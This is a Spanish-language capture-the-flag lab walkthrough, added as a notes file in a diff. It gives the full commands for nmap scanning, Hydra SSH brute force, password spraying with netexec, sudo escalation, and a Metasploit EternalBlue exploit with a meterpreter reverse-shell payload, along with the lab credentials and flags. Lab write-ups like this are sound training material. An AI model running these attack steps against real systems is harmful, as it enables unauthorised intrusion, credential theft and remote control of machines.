@@ -1,0 +1,184 @@
+dcloud
+C1sco12345
+
+1 - Entrar al Lab => listo
+2 - Fuerza bruta con Hydra => 
+
+IP Objetivo: 198.19.40.190 => entrar a SSH pero no por el puerto 22
+IP Mía: 198.19.30.48
+
+a - mapear puertos del objetivo:
+
+sudo nmap -sSV -O --open 198.19.40.190
+
+
+Puerto	Estado	Servicio	Versión
+21/tcp	open	ftp	vsftpd 2.0.8 or later
+22/tcp	open	ssh	OpenSSH 9.9p1 Debian 3 (protocol 2.0)
+80/tcp	open	http	Apache httpd 2.4.54 (Debian)
+139/tcp	open	netbios-ssn	Samba smbd 4.6.2
+445/tcp	open	netbios-ssn	Samba smbd 4.6.2
+2222/tcp	open	ssh	OpenSSH 9.9p1 Debian 3 (protocol 2.0)
+3389/tcp	open	ms-wbt-server	xrdp
+8080/tcp	open	http	Apache Jesrv (Protocol v1.3)
+8000/tcp	open	http	Apache Tomcat 9.0.30
+
+b - Usando Hydra y el user dado, hago fuerza bruta:
+
+hydra -l devuser -P /home/dcloud/wordlist.txt -V ssh://198.19.40.190
+
+User: devuser
+Password: hellokitty
+
+c - Me conecto por SSH:
+
+ssh -l devuser 198.19.40.190 -p 2222
+
+Una vez dentro, listo los archivos con "ls" y con "cat" obtengo la flag:
+
+CTF{ssh_brute_flag}
+
+3 - Hago pivoting horizontal, entro a la carpeta de devadmin y con "cat" veo el txt que hay:
+
+Important Notice to All Users:
+
+Please do not use "Password1!" as your password. It is a weak and commonly used password, making it highly vulnerable to attacks.
+To ensure the security of your accounts:
+
+1. Use passwords that are at least 12 characters long.
+2. Include a combination of uppercase letters, lowercase letters, numbers, and special characters.
+3. Avoid using easily guessable words, patterns, or default passwords.
+
+Secure passwords are critical for protecting your data and systems. Thank you for your cooperation!
+
+
+- Luego desde la consola pongo "history" y allí me aparecerá la contraseña "spiderman" que dejó devuser en el historial de comandos.
+
+Info importante que dejó escrita:
+
+exit
+ls
+cat /etc/passwd
+pwd
+ip a
+su - devadmin Spiderman
+ssh devadmin@10.1.1.2
+history
+ls file
+find my file
+cat myfile
+echo "I need to connect"
+cd ~
+df -hT
+sudo su
+mkdir data
+man inside
+df -i /dev/sda3
+history
+history
+exit
+
+- Con la información capturada previamente, me logueo como admin:
+
+su devadmin
+Spiderman => Password
+
+Luego ejecuto "sudo -l", veo que me aparece que puedo ejecutar todo como super usuario así que prosigo con "sudo su".
+
+Voy a la carpeta root y con cat me copio la flag del txt.
+
+CTF{sudoers_root_flag}
+
+4 - Me conecto al host 198.19.10.120 para conectarme por shh y según los archivos compartidos de smb, descubrir el archivo Notice.txt.
+
+Uso smbclient para acceder al host.
+
+smbclient //198.19.10.120/public -N
+
+Me aparecen estos archivos:
+
+Sharename       Type      
+---------       ----      
+ADMIN$          Disk      
+C$              Disk      
+dev_share       Disk      
+IPC$            IPC
+
+Entro a:
+
+smbclient //198.19.10.120/dev_share -N
+
+Cat "Notice.txt"
+
+Important Notice to All Users:
+
+Please do not use "Password1!" as your password. It is a weak and commonly used password, making it highly vulnerable to attacks.
+To ensure the security of your accounts:
+
+1. Use passwords that are at least 12 characters long.
+2. Include a combination of uppercase letters, lowercase letters, numbers, and special characters.
+3. Avoid using easily guessable words, patterns, or default passwords.
+
+Secure passwords are critical for protecting your data and systems. Thank you for your cooperation!
+
+Lo mismo de antes.
+
+5 - Usando la lista de usuarios que había dentro de esa carpeta y usando netexec, pruebo la contraseña de antes a ver quién la tiene.
+
+Me hice un txt con los users que me apareieron:
+
+Harry
+john 
+rita
+victoria
+William
+
+nxc smb 198.19.10.120 -u users.txt -p 'Password1!' --continue-on-success
+
+El usuario "william" era el que usó el pass débil.
+
+6 - Ahora con nmap le escaneo en busca de vulnerabilidades smb al host 198.19.10.120:
+
+a - sudo nmap -sSV 198.19.10.120
+b - nmap --script smb-vuln* -p 139,445 198.19.10.120
+
+CVE-2017-0143
+
+7 - Desafío final: explotación de EternalBlue
+
+msfconsole
+search ms17_010_psexec
+use exploit/windows/smb/ms17_010_psexec
+
+set RHOSTS 198.19.10.120
+set SMBUser william
+set SMBPass Password1!
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <tu_IP_de_Kali>
+set LPORT 4444
+
+run
+
+Una vez dentro:
+
+cd "C:\\Users\\Administrator\\Desktop"
+
+ls
+
+cat "blue_flag.txt"
+
+CTF{eternal_blue_flag}
+
+8 - Ahora tengo que encontrar el servidor AD con toda la data recopilada y entrar con el user y pass descubiertos usando nxc:
+
+nxc smb 198.19.10.0/24 -u william -p 'Password1!' --continue-on-success
+
+198.19.10.100 => server AD en el cual pertenecía William y está expuesto.
+
+9 - Una vez descubierto el servidor vulnerable, proceso a usar RDP con las credenciales de William para la última flag.
+
+rdesktop 198.19.10.100 -u william -p 'Password1!'
+
+rdesktop 198.19.10.100 -u dcloud.local\\william -p Password1!
+
+CTF{ad_success_flag}
